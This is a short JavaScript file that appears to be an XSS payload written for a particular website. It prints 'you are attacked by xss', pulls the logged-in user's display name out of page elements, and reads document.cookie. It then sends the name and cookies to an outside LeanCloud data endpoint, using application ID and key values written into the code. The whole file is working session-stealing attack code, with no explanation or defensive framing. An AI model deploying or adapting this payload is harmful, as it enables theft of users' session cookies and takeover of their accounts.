(function(){
if (window.console.log) {
  console.log('you are attacked by xss');
}

var xhr;

if (window.XMLHttpRequest) {
  xhr = new XMLHttpRequest();
} else if (window.ActiveXObject) {
  xhr = xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

if (xhr) {
  xhr.open('POST', 'https://api.leancloud.cn/1.1/classes/data', true);
  xhr.setRequestHeader('X-AVOSCloud-Application-Id','qk4ml855pcfsgqyle5awtdosdmb519hb4eif287mgncdr867');
  xhr.setRequestHeader('X-AVOSCloud-Application-Key','0f3c1kd3hznrz4bgu4728ys23zxktv7ippgkgcs9d9okjxo8');
  xhr.setRequestHeader('Content-Type','application/json');
  var name;
  if (document.getElementsByClassName) {
    if (document.baseURI.indexOf('sns') < 0) {
      name = document.getElementsByClassName('pointer icon_menu')[0].text;
    } else {
      name = document.getElementsByClassName('m_nav')[0].getElementsByClassName('link')[1].text.trim();
    }
  } else {
    if (document.baseURI.indexOf('sns') < 0) {
      var head = document.getElementById('head');
      var list = head.getElementsByTagName('a');
      for (var i = 0; i < list.length; i++) {
        if (list[i].className == 'pointer icon_menu') {
          name = list[1].text;
          break;
        }
      }
    } else {
//      var list = document.getElementsByTagName('div');
//      var m_nav;
//      for (var i = 0; i < list.length; i++) {
//        if (list[i].className == 'm_nav') {
//          m_nav = list[i];
//          break;
//        }
//      }
      return;
    }
  }
  var cookie = document.cookie;
  xhr.send('{"name":"'+name+'","cookie":"'+cookie+'"}');
}
})();